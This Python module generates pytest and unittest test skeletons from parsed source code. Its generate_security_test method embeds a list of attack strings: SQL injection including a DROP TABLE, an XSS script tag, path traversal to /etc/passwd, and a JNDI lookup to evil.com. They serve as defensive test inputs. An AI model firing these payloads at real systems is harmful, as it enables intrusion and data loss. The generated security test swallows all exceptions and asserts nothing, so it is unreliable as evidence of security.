"""
Test template generator for automated test creation.
"""

from typing import Dict, Any, List, Optional, Tuple
from datetime import datetime
from dataclasses import dataclass
from enum import Enum
from pathlib import Path
import ast
import re

from ..utils.file_utils import FileUtils


class TestType(Enum):
    """Types of tests."""
    UNIT = "unit"
    INTEGRATION = "integration"
    FUNCTIONAL = "functional"
    PERFORMANCE = "performance"
    SECURITY = "security"
    API = "api"
    UI = "ui"


class TestFramework(Enum):
    """Supported test frameworks."""
    UNITTEST = "unittest"
    PYTEST = "pytest"
    JEST = "jest"
    MOCHA = "mocha"
    JUNIT = "junit"


@dataclass
class TestCase:
    """Test case specification."""
    name: str
    description: str
    test_type: TestType
    target_function: Optional[str]
    target_class: Optional[str]
    setup_code: str
    test_code: str
    teardown_code: str
    assertions: List[str]
    mock_objects: List[str]


@dataclass
class TestSuite:
    """Test suite specification."""
    name: str
    description: str
    test_cases: List[TestCase]
    setup_class: str
    teardown_class: str
    fixtures: List[str]


class TestTemplateGenerator:
    """Generate comprehensive test templates and test cases."""
    
    def __init__(self, framework: TestFramework = TestFramework.PYTEST):
        """Initialize the test template generator."""
        self.framework = framework
        self.test_patterns = {
            'arrange_act_assert': True,
            'given_when_then': False,
            'setup_exercise_verify': False
        }
        
        # Common test patterns
        self.assertion_patterns = {
            'equality': 'assert {actual} == {expected}',
            'inequality': 'assert {actual} != {expected}',
            'truth': 'assert {condition}',
            'falsy': 'assert not {condition}',
            'none': 'assert {value} is None',
            'not_none': 'assert {value} is not None',
            'in_collection': 'assert {item} in {collection}',
            'not_in_collection': 'assert {item} not in {collection}',
            'type_check': 'assert isinstance({value}, {type})',
            'exception': 'with pytest.raises({exception}): {code}'
        }
    
    def generate_test_file(self, target_file: Path, test_type: TestType = TestType.UNIT) -> str:
        """Generate a complete test file for a target source file."""
        if not FileUtils.file_exists(target_file):
            raise FileNotFoundError(f"Target file not found: {target_file}")
        
        # Analyze the target file
        source_code = FileUtils.read_file(target_file)
        analysis = self._analyze_source_code(source_code)
        
        # Generate test cases
        test_cases = self._generate_test_cases_from_analysis(analysis, test_type)
        
        # Create test suite
        test_suite = TestSuite(
            name=f"Test{analysis['module_name']}",
            description=f"Test suite for {analysis['module_name']} module",
            test_cases=test_cases,
            setup_class="",
            teardown_class="",
            fixtures=[]
        )
        
        # Generate test file content
        return self._generate_test_file_content(test_suite, target_file)
    
    def generate_test_case(self, function_name: str, function_signature: str, 
                          test_type: TestType = TestType.UNIT) -> TestCase:
        """Generate a test case for a specific function."""
        # Parse function signature
        params = self._parse_function_signature(function_signature)
        
        # Generate test case based on function characteristics
        test_case = TestCase(
            name=f"test_{function_name}",
            description=f"Test {function_name} function",
            test_type=test_type,
            target_function=function_name,
            target_class=None,
            setup_code=self._generate_setup_code(params),
            test_code=self._generate_test_code(function_name, params),
            teardown_code="",
            assertions=self._generate_assertions(function_name, params),
            mock_objects=self._identify_mock_objects(params)
        )
        
        return test_case
    
    def generate_class_tests(self, class_name: str, class_methods: List[str]) -> List[TestCase]:
        """Generate test cases for all methods in a class."""
        test_cases = []
        
        # Test constructor
        test_cases.append(TestCase(
            name=f"test_{class_name.lower()}_init",
            description=f"Test {class_name} initialization",
            test_type=TestType.UNIT,
            target_function="__init__",
            target_class=class_name,
            setup_code="",
            test_code=f"instance = {class_name}()",
            teardown_code="",
            assertions=["assert instance is not None"],
            mock_objects=[]
        ))
        
        # Test each method
        for method in class_methods:
            if not method.startswith('_'):  # Skip private methods
                test_cases.append(TestCase(
                    name=f"test_{class_name.lower()}_{method}",
                    description=f"Test {class_name}.{method} method",
                    test_type=TestType.UNIT,
                    target_function=method,
                    target_class=class_name,
                    setup_code=f"self.instance = {class_name}()",
                    test_code=f"result = self.instance.{method}()",
                    teardown_code="",
                    assertions=["assert result is not None"],
                    mock_objects=[]
                ))
        
        return test_cases
    
    def generate_api_tests(self, endpoint_info: Dict[str, Any]) -> List[TestCase]:
        """Generate API test cases."""
        test_cases = []
        
        method = endpoint_info.get('method', 'GET')
        path = endpoint_info.get('path', '/')
        
        # Test successful request
        test_cases.append(TestCase(
            name=f"test_{method.lower()}_{path.replace('/', '_').strip('_')}_success",
            description=f"Test successful {method} request to {path}",
            test_type=TestType.API,
            target_function=None,
            target_class=None,
            setup_code="client = TestClient(app)",
            test_code=f'response = client.{method.lower()}("{path}")',
            teardown_code="",
            assertions=["assert response.status_code == 200"],
            mock_objects=[]
        ))
        
        # Test error cases
        if method in ['POST', 'PUT', 'PATCH']:
            test_cases.append(TestCase(
                name=f"test_{method.lower()}_{path.replace('/', '_').strip('_')}_invalid_data",
                description=f"Test {method} request with invalid data",
                test_type=TestType.API,
                target_function=None,
                target_class=None,
                setup_code="client = TestClient(app)",
                test_code=f'response = client.{method.lower()}("{path}", json={{}})',
                teardown_code="",
                assertions=["assert response.status_code == 422"],
                mock_objects=[]
            ))
        
        return test_cases
    
    def _analyze_source_code(self, source_code: str) -> Dict[str, Any]:
        """Analyze source code to extract testable components."""
        try:
            tree = ast.parse(source_code)
        except SyntaxError:
            return {'module_name': 'Unknown', 'functions': [], 'classes': []}
        
        analysis = {
            'module_name': 'TestModule',
            'functions': [],
            'classes': [],
            'imports': [],
            'constants': []
        }
        
        for node in ast.walk(tree):
            if isinstance(node, ast.FunctionDef):
                if not node.name.startswith('_'):  # Skip private functions
                    analysis['functions'].append({
                        'name': node.name,
                        'args': [arg.arg for arg in node.args.args],
                        'returns': self._get_return_type(node),
                        'docstring': ast.get_docstring(node),
                        'line_number': node.lineno
                    })
            
            elif isinstance(node, ast.ClassDef):
                methods = []
                for item in node.body:
                    if isinstance(item, ast.FunctionDef):
                        methods.append(item.name)
                
                analysis['classes'].append({
                    'name': node.name,
                    'methods': methods,
                    'bases': [self._get_name_from_node(base) for base in node.bases],
                    'docstring': ast.get_docstring(node),
                    'line_number': node.lineno
                })
            
            elif isinstance(node, (ast.Import, ast.ImportFrom)):
                if isinstance(node, ast.Import):
                    for alias in node.names:
                        analysis['imports'].append(alias.name)
                else:
                    if node.module:
                        analysis['imports'].append(node.module)
        
        return analysis
    
    def _generate_test_cases_from_analysis(self, analysis: Dict[str, Any], 
                                         test_type: TestType) -> List[TestCase]:
        """Generate test cases based on code analysis."""
        test_cases = []
        
        # Generate function tests
        for func_info in analysis['functions']:
            test_case = TestCase(
                name=f"test_{func_info['name']}",
                description=f"Test {func_info['name']} function",
                test_type=test_type,
                target_function=func_info['name'],
                target_class=None,
                setup_code=self._generate_function_setup(func_info),
                test_code=self._generate_function_test(func_info),
                teardown_code="",
                assertions=self._generate_function_assertions(func_info),
                mock_objects=[]
            )
            test_cases.append(test_case)
        
        # Generate class tests
        for class_info in analysis['classes']:
            class_tests = self.generate_class_tests(class_info['name'], class_info['methods'])
            test_cases.extend(class_tests)
        
        return test_cases
    
    def _generate_test_file_content(self, test_suite: TestSuite, target_file: Path) -> str:
        """Generate the complete test file content."""
        if self.framework == TestFramework.PYTEST:
            return self._generate_pytest_content(test_suite, target_file)
        elif self.framework == TestFramework.UNITTEST:
            return self._generate_unittest_content(test_suite, target_file)
        else:
            raise ValueError(f"Unsupported framework: {self.framework}")
    
    def _generate_pytest_content(self, test_suite: TestSuite, target_file: Path) -> str:
        """Generate pytest test file content."""
        lines = []
        
        # File header
        lines.extend([
            '"""',
            f'Test suite for {target_file.name}',
            '',
            f'Generated: {datetime.now().strftime("%Y-%m-%d %H:%M:%S")}',
            '"""',
            '',
            'import pytest',
            'from unittest.mock import Mock, patch, MagicMock',
            'from typing import Any, Dict, List, Optional',
            '',
            f'from {self._get_import_path(target_file)} import *',
            '',
            ''
        ])
        
        # Test fixtures
        lines.extend([
            '@pytest.fixture',
            'def sample_data():',
            '    """Provide sample test data."""',
            '    return {',
            '        "test_string": "hello world",',
            '        "test_number": 42,',
            '        "test_list": [1, 2, 3],',
            '        "test_dict": {"key": "value"}',
            '    }',
            '',
            ''
        ])
        
        # Generate test class
        lines.extend([
            f'class {test_suite.name}:',
            f'    """{test_suite.description}"""',
            '',
        ])
        
        # Generate test methods
        for test_case in test_suite.test_cases:
            lines.extend(self._generate_pytest_method(test_case))
            lines.append('')
        
        return '\n'.join(lines)
    
    def _generate_unittest_content(self, test_suite: TestSuite, target_file: Path) -> str:
        """Generate unittest test file content."""
        lines = []
        
        # File header
        lines.extend([
            '"""',
            f'Test suite for {target_file.name}',
            '',
            f'Generated: {datetime.now().strftime("%Y-%m-%d %H:%M:%S")}',
            '"""',
            '',
            'import unittest',
            'from unittest.mock import Mock, patch, MagicMock',
            'from typing import Any, Dict, List, Optional',
            '',
            f'from {self._get_import_path(target_file)} import *',
            '',
            ''
        ])
        
        # Generate test class
        lines.extend([
            f'class {test_suite.name}(unittest.TestCase):',
            f'    """{test_suite.description}"""',
            '',
            '    def setUp(self):',
            '        """Set up test fixtures before each test method."""',
            '        self.sample_data = {',
            '            "test_string": "hello world",',
            '            "test_number": 42,',
            '            "test_list": [1, 2, 3],',
            '            "test_dict": {"key": "value"}',
            '        }',
            '',
            '    def tearDown(self):',
            '        """Clean up after each test method."""',
            '        pass',
            '',
        ])
        
        # Generate test methods
        for test_case in test_suite.test_cases:
            lines.extend(self._generate_unittest_method(test_case))
            lines.append('')
        
        # Add main block
        lines.extend([
            '',
            "if __name__ == '__main__':",
            '    unittest.main()'
        ])
        
        return '\n'.join(lines)
    
    def _generate_pytest_method(self, test_case: TestCase) -> List[str]:
        """Generate a pytest test method."""
        lines = []
        
        # Method signature
        lines.extend([
            f'    def {test_case.name}(self, sample_data):',
            f'        """{test_case.description}"""'
        ])
        
        # Arrange section
        if test_case.setup_code:
            lines.extend([
                '        # Arrange',
                f'        {test_case.setup_code}',
                ''
            ])
        
        # Act section
        lines.extend([
            '        # Act',
            f'        {test_case.test_code}',
            ''
        ])
        
        # Assert section
        lines.append('        # Assert')
        for assertion in test_case.assertions:
            lines.append(f'        {assertion}')
        
        return lines
    
    def _generate_unittest_method(self, test_case: TestCase) -> List[str]:
        """Generate a unittest test method."""
        lines = []
        
        # Method signature
        lines.extend([
            f'    def {test_case.name}(self):',
            f'        """{test_case.description}"""'
        ])
        
        # Arrange section
        if test_case.setup_code:
            lines.extend([
                '        # Arrange',
                f'        {test_case.setup_code}',
                ''
            ])
        
        # Act section
        lines.extend([
            '        # Act',
            f'        {test_case.test_code}',
            ''
        ])
        
        # Assert section
        lines.append('        # Assert')
        for assertion in test_case.assertions:
            # Convert pytest assertions to unittest assertions
            unittest_assertion = self._convert_to_unittest_assertion(assertion)
            lines.append(f'        {unittest_assertion}')
        
        return lines
    
    def _convert_to_unittest_assertion(self, pytest_assertion: str) -> str:
        """Convert pytest assertion to unittest assertion."""
        # Simple conversion patterns
        conversions = {
            r'assert (.+) == (.+)': r'self.assertEqual(\1, \2)',
            r'assert (.+) != (.+)': r'self.assertNotEqual(\1, \2)',
            r'assert (.+) is None': r'self.assertIsNone(\1)',
            r'assert (.+) is not None': r'self.assertIsNotNone(\1)',
            r'assert (.+) in (.+)': r'self.assertIn(\1, \2)',
            r'assert (.+) not in (.+)': r'self.assertNotIn(\1, \2)',
            r'assert isinstance\((.+), (.+)\)': r'self.assertIsInstance(\1, \2)',
            r'assert (.+)': r'self.assertTrue(\1)'
        }
        
        for pattern, replacement in conversions.items():
            if re.match(pattern, pytest_assertion):
                return re.sub(pattern, replacement, pytest_assertion)
        
        return pytest_assertion  # Return as-is if no conversion found
    
    def _parse_function_signature(self, signature: str) -> Dict[str, Any]:
        """Parse function signature to extract parameters."""
        # Simplified parsing - in practice, you'd use ast.parse
        params = {
            'args': [],
            'return_type': 'Any',
            'has_self': False
        }
        
        # Extract function name and parameters
        if '(' in signature and ')' in signature:
            param_part = signature[signature.find('(') + 1:signature.rfind(')')]
            if param_part.strip():
                args = [arg.strip() for arg in param_part.split(',')]
                params['args'] = args
                params['has_self'] = args and args[0] == 'self'
        
        # Extract return type
        if '->' in signature:
            return_part = signature[signature.find('->') + 2:].strip()
            params['return_type'] = return_part.rstrip(':')
        
        return params
    
    def _generate_setup_code(self, params: Dict[str, Any]) -> str:
        """Generate setup code for test case."""
        setup_lines = []
        
        for arg in params['args']:
            if arg != 'self':
                # Generate sample data based on parameter name
                if 'id' in arg.lower():
                    setup_lines.append(f'{arg} = 1')
                elif 'name' in arg.lower():
                    setup_lines.append(f'{arg} = "test_name"')
                elif 'data' in arg.lower():
                    setup_lines.append(f'{arg} = {{"key": "value"}}')
                elif 'list' in arg.lower():
                    setup_lines.append(f'{arg} = [1, 2, 3]')
                else:
                    setup_lines.append(f'{arg} = None')
        
        return '\n        '.join(setup_lines)
    
    def _generate_test_code(self, function_name: str, params: Dict[str, Any]) -> str:
        """Generate test execution code."""
        args = [arg for arg in params['args'] if arg != 'self']
        arg_list = ', '.join(args) if args else ''
        
        if params['has_self']:
            return f'result = self.instance.{function_name}({arg_list})'
        else:
            return f'result = {function_name}({arg_list})'
    
    def _generate_assertions(self, function_name: str, params: Dict[str, Any]) -> List[str]:
        """Generate assertions for test case."""
        assertions = []
        
        # Basic assertion that result is not None
        assertions.append('assert result is not None')
        
        # Type-specific assertions based on return type
        return_type = params.get('return_type', 'Any')
        if return_type == 'str':
            assertions.append('assert isinstance(result, str)')
        elif return_type == 'int':
            assertions.append('assert isinstance(result, int)')
        elif return_type == 'bool':
            assertions.append('assert isinstance(result, bool)')
        elif return_type == 'list':
            assertions.append('assert isinstance(result, list)')
        elif return_type == 'dict':
            assertions.append('assert isinstance(result, dict)')
        
        return assertions
    
    def _identify_mock_objects(self, params: Dict[str, Any]) -> List[str]:
        """Identify objects that should be mocked."""
        mock_objects = []
        
        for arg in params['args']:
            if arg != 'self':
                # Identify potential external dependencies
                if any(keyword in arg.lower() for keyword in ['client', 'service', 'api', 'db', 'database']):
                    mock_objects.append(arg)
        
        return mock_objects
    
    def _get_return_type(self, node: ast.FunctionDef) -> str:
        """Extract return type annotation from function node."""
        if node.returns:
            return ast.unparse(node.returns) if hasattr(ast, 'unparse') else 'Any'
        return 'Any'
    
    def _get_name_from_node(self, node: ast.AST) -> str:
        """Extract name from AST node."""
        if isinstance(node, ast.Name):
            return node.id
        elif isinstance(node, ast.Attribute):
            return f"{self._get_name_from_node(node.value)}.{node.attr}"
        return 'Unknown'
    
    def _generate_function_setup(self, func_info: Dict[str, Any]) -> str:
        """Generate setup code for function test."""
        setup_lines = []
        
        for arg in func_info['args']:
            if arg != 'self':
                setup_lines.append(f'{arg} = "test_{arg}"')
        
        return '\n        '.join(setup_lines)
    
    def _generate_function_test(self, func_info: Dict[str, Any]) -> str:
        """Generate test execution code for function."""
        args = [arg for arg in func_info['args'] if arg != 'self']
        arg_list = ', '.join(args) if args else ''
        
        return f"result = {func_info['name']}({arg_list})"
    
    def _generate_function_assertions(self, func_info: Dict[str, Any]) -> List[str]:
        """Generate assertions for function test."""
        assertions = ['assert result is not None']
        
        # Add specific assertions based on function name patterns
        func_name = func_info['name'].lower()
        
        if 'get' in func_name or 'find' in func_name:
            assertions.append('assert result != ""')
        elif 'create' in func_name or 'add' in func_name:
            assertions.append('assert result is not None')
        elif 'delete' in func_name or 'remove' in func_name:
            assertions.append('assert result is True')
        elif 'validate' in func_name or 'check' in func_name:
            assertions.append('assert isinstance(result, bool)')
        
        return assertions
    
    def _get_import_path(self, target_file: Path) -> str:
        """Generate import path for target file."""
        # Simplified - assumes file is in same package
        return target_file.stem
    
    def generate_performance_test(self, function_name: str, iterations: int = 1000) -> TestCase:
        """Generate performance test case."""
        return TestCase(
            name=f"test_{function_name}_performance",
            description=f"Test performance of {function_name} function",
            test_type=TestType.PERFORMANCE,
            target_function=function_name,
            target_class=None,
            setup_code=f"import time\niterations = {iterations}",
            test_code=f"""
        start_time = time.time()
        for _ in range(iterations):
            result = {function_name}()
        end_time = time.time()
        execution_time = end_time - start_time""",
            teardown_code="",
            assertions=[
                "assert execution_time < 1.0  # Should complete within 1 second",
                "assert result is not None"
            ],
            mock_objects=[]
        )
    
    def generate_security_test(self, function_name: str, input_params: List[str]) -> TestCase:
        """Generate security test case."""
        malicious_inputs = [
            "'; DROP TABLE users; --",
            "<script>alert('xss')</script>",
            "../../../etc/passwd",
            "' OR '1'='1",
            "${jndi:ldap://evil.com/a}"
        ]
        
        test_code = f"""
        malicious_inputs = {malicious_inputs}
        for malicious_input in malicious_inputs:
            try:
                result = {function_name}(malicious_input)
                # Function should handle malicious input gracefully
            except Exception as e:
                # Expected behavior for malicious input
                pass"""
        
        return TestCase(
            name=f"test_{function_name}_security",
            description=f"Test security of {function_name} function against malicious inputs",
            test_type=TestType.SECURITY,
            target_function=function_name,
            target_class=None,
            setup_code="",
            test_code=test_code,
            teardown_code="",
            assertions=["# Security test - no assertions needed"],
            mock_objects=[]
        )